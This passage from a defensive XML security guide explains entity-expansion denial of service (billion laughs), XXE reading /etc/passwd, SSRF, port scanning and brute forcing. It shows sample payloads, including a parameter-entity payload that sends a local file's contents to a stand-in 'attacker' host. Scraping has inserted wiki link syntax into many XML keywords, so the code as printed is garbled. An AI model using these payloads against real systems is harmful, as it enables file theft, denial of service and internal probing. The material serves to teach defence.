 <![[_content/dictionary#E|ELEMENT]] root [[_content/dictionary#A|ANY]]>
 <![[_content/dictionary#E|ENTITY]] A "AAAAA...(a 100.000 A's)...AAAAA">
]>
<root>&A;&A;&A;&A;...(a 100.000 &A;'s)...&A;&A;&A;&A;&A;</root>

##### Billion Laughs¶
When an [[_content/dictionary#X|XML]] parser tries to resolve the external entities included within the following code, it will cause the application to start consuming all of the available memory until the process crashes. This is an example XML document with an embedded [[_content/dictionary#D|DTD]] schema including the attack:
<![[_content/dictionary#D|DOCTYPE]] root [
 <![[_content/dictionary#E|ELEMENT]] root [[_content/dictionary#A|ANY]]>
 <![[_content/dictionary#E|ENTITY]] [[_content/dictionary#L|LOL]] "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<root>&LOL9;</root>

The entity LOL9 will be resolved as the 10 entities defined in LOL8; then each of these entities will be resolved in LOL7 and so on. Finally, the [[_content/dictionary#C|CPU]] and/or memory will be affected by parsing the 3 x 10^9 (3,000,000,000) entities defined in this schema, which could make the parser crash.
The Simple Object Access Protocol ([[_content/dictionary#S|SOAP]]) specification forbids DTDs completely. This means that a SOAP processor can reject any SOAP message that contains a [[_content/dictionary#D|DTD]]. Despite this specification, certain SOAP implementations did parse DTD schemas within SOAP messages.
The following example illustrates a case where the parser is not following the specification, enabling a reference to a DTD in a SOAP message:
<?[[_content/dictionary#X|XML]] [[_content/dictionary#V|VERSION]]="1.0" [[_content/dictionary#E|ENCODING]]="[[_content/dictionary#U|UTF]]-8"?>
<![[_content/dictionary#D|DOCTYPE]] SOAP-[[_content/dictionary#E|ENV]]:[[_content/dictionary#E|ENVELOPE]] [
 <![[_content/dictionary#E|ELEMENT]] SOAP-ENV:ENVELOPE [[_content/dictionary#A|ANY]]>
 <![[_content/dictionary#A|ATTLIST]] SOAP-ENV:ENVELOPE [[_content/dictionary#E|ENTITYREFERENCE]] [[_content/dictionary#C|CDATA]] #[[_content/dictionary#I|IMPLIED]]>
 <![[_content/dictionary#E|ENTITY]] [[_content/dictionary#L|LOL]] "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<SOAP:ENVELOPE ENTITYREFERENCE="&LOL9;"
               [[_content/dictionary#X|XMLNS]]:SOAP="[[_content/dictionary#H|HTTP]]://[[_content/dictionary#S|SCHEMAS]].[[_content/dictionary#X|XMLSOAP]].[[_content/dictionary#O|ORG]]/[[_content/dictionary#S|SOAP]]/[[_content/dictionary#E|ENVELOPE]]/">
 <SOAP:[[_content/dictionary#B|BODY]]>
  <[[_content/dictionary#K|KEYWORD]] XMLNS="[[_content/dictionary#U|URN]]:[[_content/dictionary#P|PARASOFT]]:[[_content/dictionary#W|WS]]:[[_content/dictionary#S|STORE]]">[[_content/dictionary#F|FOO]]</KEYWORD>
 </SOAP:BODY>
</SOAP:ENVELOPE>

##### Reflected File Retrieval¶
Consider the following example code of an [[_content/dictionary#X|XXE]]:
<?xml version="1.0" encoding="[[_content/dictionary#I|ISO]]-8859-1"?>
<![[_content/dictionary#D|DOCTYPE]] root [
 <![[_content/dictionary#E|ELEMENT]] includeme [[_content/dictionary#A|ANY]]>
 <![[_content/dictionary#E|ENTITY]] xxe [[_content/dictionary#S|SYSTEM]] "/etc/passwd">
]>
<root>&xxe;</root>

The previous [[_content/dictionary#X|XML]] defines an entity named xxe, which is in fact the contents of /etc/passwd, which will be expanded within the includeme tag. If the parser allows references to external entities, it might include the contents of that file in the XML response or in the error output.
##### Server Side Request Forgery¶
Server Side Request Forgery ([[_content/dictionary#S|SSRF]]) happens when the server receives a malicious XML schema, which makes the server retrieve remote resources such as a file via [[_content/dictionary#H|HTTP]]/[[_content/dictionary#H|HTTPS]]/[[_content/dictionary#F|FTP]], etc. SSRF has been used to retrieve remote files, to prove a [[_content/dictionary#X|XXE]] when you cannot reflect back the file or perform port scanning, or perform brute force attacks on internal networks.
###### External [[_content/dictionary#D|DNS]] Resolution¶
Sometimes it is possible to induce the application to perform server-side DNS lookups of arbitrary domain names. This is one of the simplest forms of SSRF, but requires the attacker to analyze the DNS traffic. Burp has a plugin that checks for this attack.
<![[_content/dictionary#D|DOCTYPE]] m [[_content/dictionary#P|PUBLIC]] "-//B/A/[[_content/dictionary#E|EN]]" "http://checkforthisspecificdomain.example.com">

###### External Connection¶
Whenever there is an [[_content/dictionary#X|XXE]] and you cannot retrieve a file, you can test if you would be able to establish remote connections:
<?xml version="1.0" encoding="[[_content/dictionary#U|UTF]]-8"?>
<![[_content/dictionary#D|DOCTYPE]] root [
 <![[_content/dictionary#E|ENTITY]] % xxe [[_content/dictionary#S|SYSTEM]] "http://attacker/evil.dtd">
 %xxe;
]>

###### File Retrieval with Parameter Entities¶
Parameter entities allows for the retrieval of content using [[_content/dictionary#U|URL]] references. Consider the following malicious [[_content/dictionary#X|XML]] document:
<?xml version="1.0" encoding="utf-8"?>
<![[_content/dictionary#D|DOCTYPE]] root [
 <![[_content/dictionary#E|ENTITY]] % file [[_content/dictionary#S|SYSTEM]] "file:///etc/passwd">
 <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
 %dtd;
]>
<root>&send;</root>

Here the [[_content/dictionary#D|DTD]] defines two external parameter entities: file loads a local file, and dtd which loads a remote DTD. The remote DTD should contain something like this:
<?xml version="1.0" encoding="[[_content/dictionary#U|UTF]]-8"?>
<![[_content/dictionary#E|ENTITY]] % all "<!ENTITY send [[_content/dictionary#S|SYSTEM]] 'http://example.com/?%file;'>">
%all;

The second [[_content/dictionary#D|DTD]] causes the system to send the contents of the file back to the attacker's server as a parameter of the [[_content/dictionary#U|URL]].
###### Port Scanning¶
The amount and type of information generated by port scanning will depend on the type of implementation. Responses can be classified as follows, ranking from easy to complex:
1) Complete Disclosure: This is the simplest and most unusual scenario, with complete disclosure you can clearly see what's going on by receiving the complete responses from the server being queried. You have an exact representation of what happened when connecting to the remote host.
2) Error-based: If you are unable to see the response from the remote server, you may be able to use the information generated by the error response. Consider a web service leaking details on what went wrong in the [[_content/dictionary#S|SOAP]] Fault element when trying to establish a connection:
java.io.IOException: Server returned [[_content/dictionary#H|HTTP]] response code: 401 for URL: http://192.168.1.1:80
 at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
 at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)

3) Timeout-based: The scanner could generate timeouts when it connects to open or closed ports depending on the schema and the underlying implementation. If the timeouts occur while you are trying to connect to a closed port (which may take one minute), the time of response when connected to a valid port will be very quick (one second, for example). The differences between open and closed ports becomes quite clear.
4) Time-based: Sometimes it may be difficult to tell the differences between closed and open ports because the results are very subtle. The only way to know the status of a port with certainty would be to take multiple measurements of the time required to reach each host, then you should analyze the average time for each port to determinate the status of each port. This type of attack will be difficult to accomplish if it is performed in higher latency networks.
###### Brute Forcing¶
Once an attacker confirms that it is possible to perform a port scan, performing a brute force attack is a matter of embedding the username and password as part of the [[_content/dictionary#U|URI]] scheme (http, ftp, etc). For example, see the following example:
<![[_content/dictionary#D|DOCTYPE]] root [
 <![[_content/dictionary#E|ENTITY]] user [[_content/dictionary#S|SYSTEM]] "http://username:password@example.com:8080">
]>
<root>&user;</root>